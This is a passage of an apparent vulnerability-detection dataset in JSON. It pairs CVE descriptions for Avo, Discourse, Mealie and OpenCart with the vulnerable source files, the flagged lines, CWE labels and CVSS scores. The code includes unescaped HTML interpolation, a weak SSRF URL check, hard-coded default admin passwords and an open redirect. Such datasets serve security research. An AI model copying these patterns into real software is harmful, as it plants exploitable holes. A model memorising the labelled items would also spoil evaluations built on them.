$this->error($e->getMessage());\n            }\n        }\n    }\n\n    /**\n     * Method for asking default locale choice based on the list of options.\n     */\n    protected function askForDefaultLocale(string $key, string $question, array $choices): string\n    {\n        $choice = select(\n            label: $question,\n            options: $choices,\n            default: env($key)\n        );\n\n        return $choice;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function handle()\n    {\n        $userName = $this->option('name') ?: text(\n            label: 'Set the Name for User',\n            default: 'Admin',\n            required: true\n        );\n\n        $userEmail = $this->option('email');\n\n        if (! $userEmail || ! filter_var($userEmail, FILTER_VALIDATE_EMAIL)) {\n            $userEmail = text(\n                label: 'Provide Email of User',\n                default: 'admin@example.com',\n                validate: fn (string $value) => match (true) {\n                    ! filter_var($value, FILTER_VALIDATE_EMAIL) => 'The provided email is invalid, kindly enter a valid email address.',\n                    default                                     => null\n                }\n            );\n        }\n\n        $userPassword = $this->option('password') ?: text(\n            label: 'Input a Secure Password for User',\n            default: 'admin@123',\n            required: true\n        );\n\n        while (strlen($userPassword) < 6) {\n            $this->error('Password must be at least 6 characters.');\n\n            $userPassword = text(\n                label: 'Input a Secure Password for User',\n                default: 'admin@123',\n                required: true\n            );\n        }\n\n        $password = password_hash($userPassword, PASSWORD_BCRYPT, ['cost' => 10]);\n\n        $timezone = $this->option('timezone') ?? date_default_timezone_get();\n\n        $this->info('Your Default Timezone is '.$timezone);\n\n        $defaultLocale = $this->option('ui_locale') ?: $this->askForDefaultLocale(\n            'APP_LOCALE',\n            'Please select the default application locale',\n            $this->locales\n        );\n\n        $isAdmin = $this->option('admin');\n        $localeId = DB::table('locales')->where('code', $defaultLocale)->where('status', 1)->first()?->id ?? 58;\n        $role = $isAdmin ? DB::table('roles')->where('permission_type', 'all')->first()?->id : DB::table('roles')->where('permission_type', 'custom')->first()?->id;\n\n        if (! $role) {\n            DB::table('roles')->updateOrInsert(\n                [\n                    'name'            => $isAdmin ? 'Admin' : 'User',\n                    'description'     => $isAdmin ? 'This role users will have all the access' : 'This role users have limited access',\n                    'permission_type' => $isAdmin ? 'all' : 'custom',\n                    'permissions'     => ! $isAdmin ? json_encode(['dashboard']) : null,\n                ]\n            );\n        }\n\n        $role = $isAdmin ? DB::table('roles')->where('permission_type', 'all')->first()?->id : DB::table('roles')->where('permission_type', 'custom')->first()?->id;\n\n        try {\n            DB::table('admins')->updateOrInsert(\n                [\n                    'api_token'    => Str::random(80),\n                    'created_at'   => date('Y-m-d H:i:s'),\n                    'name'         => $userName,\n                    'email'        => $userEmail,\n                    'password'     => $password,\n                    'role_id'      => $role,\n                    'status'       => 1,\n                    'timezone'     => $timezone,\n                    'ui_locale_id' => $localeId,\n                    'updated_at'   => date('Y-m-d H:i:s'),\n                ]\n            );\n\n            $this->info('-----------------------------');\n            $this->info('Congratulations! The User has been created successfully.');\n            $this->info('Please navigate to: '.env('APP_URL').'/admin'.' and use the following credentials for authentication:');\n            $this->info('Email: '.$userEmail);\n            $this->info('Password: '.$userPassword);\n            $this->info('Cheers!');\n        } catch (\\Exception $e) {\n            if (strpos($e->getMessage(), 'Duplicate entry')) {\n                $this->error('User with email '.$userEmail.' already exists.');\n            } else {\n                $this->error($e->getMessage());\n            }\n        }\n    }",
        "protected function askForDefaultLocale(string $key, string $question, array $choices): string\n    {\n        $choice = select(\n            label: $question,\n            options: $choices,\n            default: env($key)\n        );\n\n        return $choice;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 57,
          "content": "        $userName = $this->option('name') ?: text("
        },
        {
          "line_no": 59,
          "content": "            default: 'Admin',"
        },
        {
          "line_no": 60,
          "content": "            required: true"
        },
        {
          "line_no": 68,
          "content": "                default: 'admin@example.com',"
        },
        {
          "line_no": 78,
          "content": "            default: 'admin@123',"
        },
        {
          "line_no": 83,
          "content": "            $this->error('Password must be at least 6 characters.');"
        },
        {
          "line_no": 87,
          "content": "                default: 'admin@123',"
        },
        {
          "line_no": 94,
          "content": "        $timezone = $this->option('timezone') ?? date_default_timezone_get();"
        },
        {
          "line_no": 96,
          "content": "        $this->info('Your Default Timezone is '.$timezone);"
        },
        {
          "line_no": 98,
          "content": "        $defaultLocale = $this->option('ui_locale') ?: $this->askForDefaultLocale("
        },
        {
          "line_no": 104,
          "content": "        $isAdmin = $this->option('admin');"
        },
        {
          "line_no": 155,
          "content": "    protected function askForDefaultLocale(string $key, string $question, array $choices): string"
        }
      ]
    },
    "cwe": [
      "CWE-692",
      "CWE-616"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 93,
    "cve": "CVE-2024-22411",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. In Avo 3 pre12, any HTML inside text that is passed to `error` or `succeed` in an `Avo::BaseAction` subclass will be rendered directly without sanitization in the toast/notification that appears in the UI on Action completion. A malicious user could exploit this vulnerability to trigger a cross site scripting attack on an unsuspecting user. This issue has been addressed in the 3.3.0 and 2.47.0 releases of Avo. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1018,
    "cve": "CVE-2024-37299",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, crafting requests to submit very long tag group names can reduce the availability of a Discourse instance. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 67,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.9,
    "cvss_version": 3.1
  },
  {
    "id": 691,
    "cve": "CVE-2024-31991",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the safe_scrape_html function utilizes a user-controlled URL to issue a request to a remote server. Based on the content of the response, it will either parse the content or disregard it. This function, nor those that call it, add any restrictions on the URL that can be provided, nor is it restricted to being an FQDN (i.e., an IP address can be provided). As this function’s return will be handled differently by its caller depending on the response, it is possible for an attacker to use this functionality to positively identify HTTP(s) servers on the local network with any IP/port combination. This issue can result in any authenticated user being able to map HTTP servers on a local network that the Mealie service has access to. Note that by default any user can create an account on a Mealie server, and that the default changeme@example.com user is available with its hard-coded password. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.1,
    "cvss_version": 3.1
  },
  {
    "id": 879,
    "cve": "CVE-2024-21515",
    "description": "This affects versions of the package opencart/opencart from 4.0.0.0. A reflected XSS issue was identified in the filename parameter of the admin tool/log route. An attacker could obtain a user's token by tricking the user to click on a maliciously crafted URL. The user is then prompted to login and redirected again upon authentication with the payload automatically executing. If the attacked user has admin privileges, this vulnerability could be used as the start of a chain of exploits like Zip Slip or arbitrary file write vulnerabilities in the admin functionality.\r\r**Notes:**\r\r1) This is only exploitable if the attacker knows the name or path of the admin directory. The name of the directory is \"admin\" by default but there is a pop-up in the dashboard warning users to rename it.\r\r2) The fix for this vulnerability is incomplete. The redirect is removed so that it is not possible for an attacker to control the redirect post admin login anymore, but it is still possible to exploit this issue in admin if the user is authenticated as an admin already.",
    "vulnerability": {
      "file_level": [
        {
          "name": "upload/admin/controller/common/login.php",
          "content": "<?php\nnamespace Opencart\\Admin\\Controller\\Common;\n/**\n * Class Login\n *\n * @package Opencart\\Admin\\Controller\\Common\n */\nclass Login extends \\Opencart\\System\\Engine\\Controller {\n\t/**\n\t * Index\n\t *\n\t * @return void\n\t */\n\tpublic function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}\n\n\t/**\n\t * Login\n\t *\n\t * @return void\n\t */\n\tpublic function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}",
